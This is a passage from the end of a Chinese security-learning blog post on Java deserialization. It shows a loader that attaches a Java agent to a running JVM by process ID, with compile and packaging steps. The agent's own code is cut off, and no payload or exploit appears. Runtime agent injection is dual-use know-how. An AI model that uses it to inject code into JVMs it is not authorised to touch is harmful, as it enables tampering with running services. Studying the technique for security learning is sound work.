class="hljs-comment">// 不修改其他类</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h5 id="2-动态-Attach-加载器代码（AttachAgent-java）"><a href="#2-动态-Attach-加载器代码（AttachAgent-java）" class="headerlink" title="2. 动态 Attach 加载器代码（AttachAgent.java）"></a>2. 动态 Attach 加载器代码（<code>AttachAgent.java</code>）</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttachAgent</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (args.length != <span class="hljs-number">2</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Usage: java AttachAgent &lt;PID&gt; &lt;path_to_agent_jar&gt;&quot;</span>);<br>            System.exit(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">targetPid</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">String</span> <span class="hljs-variable">agentPath</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">1</span>];<br><br>        System.out.println(<span class="hljs-string">&quot;Attaching to target JVM with PID: &quot;</span> + targetPid);<br>        <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> VirtualMachine.attach(targetPid);<br>        vm.loadAgent(agentPath);<br>        vm.detach();<br>        System.out.println(<span class="hljs-string">&quot;Agent attached successfully.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h5 id="3-编译与打包步骤"><a href="#3-编译与打包步骤" class="headerlink" title="3. 编译与打包步骤"></a>3. 编译与打包步骤</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 假设当前目录结构如下：</span><br><span class="hljs-comment"># ./agent/MyAgent.java</span><br><span class="hljs-comment"># ./AttachAgent.java</span><br><br><span class="hljs-comment"># 1. 编译 Agent（需要 javassist.jar）</span><br>javac -<span class="hljs-built_in">cp</span> javassist.jar -d out agent/MyAgent.java<br><br><span class="hljs-comment"># 2. 编译 AttachAgent（需要 tools.jar，JDK8 在 $JAVA_HOME/lib/tools.jar）</span><br>javac -<span class="hljs-built_in">cp</span> <span class="hljs-variable">$JAVA_HOME</span>/lib/tools.jar -d out AttachAgent.java<br><br><span class="hljs-comment"># 3. 打包 Agent JAR</span><br><span class="hljs-built_in">cd</span> out<br>jar cvfm agent.jar ../MANIFEST.MF agent/MyAgent.class<br><br><span class="hljs-comment"># MANIFEST.MF 内容示例：</span><br><span class="hljs-comment"># Manifest-Version: 1.0</span><br><span class="hljs-comment"># Agent-Class: agent.MyAgent</span><br><span class="hljs-comment"># Can-Redefine-Classes: true</span><br><span class="hljs-comment"># Can-Retransform-Classes: true</span><br><span class="hljs-comment"># Premain-Class: agent.MyAgent</span><br><br><span class="hljs-comment"># 4. 运行AttachAgent</span><br><span class="hljs-comment"># java -cp out:$JAVA_HOME/lib/tools.jar AttachAgent &lt;target-JVM-PID&gt; /full/path/to/agent.jar</span><br></code></pre></td></tr></table></figure>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/java%E5%AE%89%E5%85%A8-java%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#-java安全 -java入门反序列化</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>java入门反序列化</div>
      <div>https://eznp.github.io/2025/07/22/java入门反序列化/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Zer0</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年7月22日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/10/04/pwn%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0%EF%BC%881%EF%BC%89/" title="pwn学习小记（1）">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">pwn学习小记（1）</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/06/11/java-urldns%E9%93%BE%E5%88%86%E6%9E%90/" title="java-urldns链分析">
                        <span class="hidden-mobile">java-urldns链分析</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
</html>
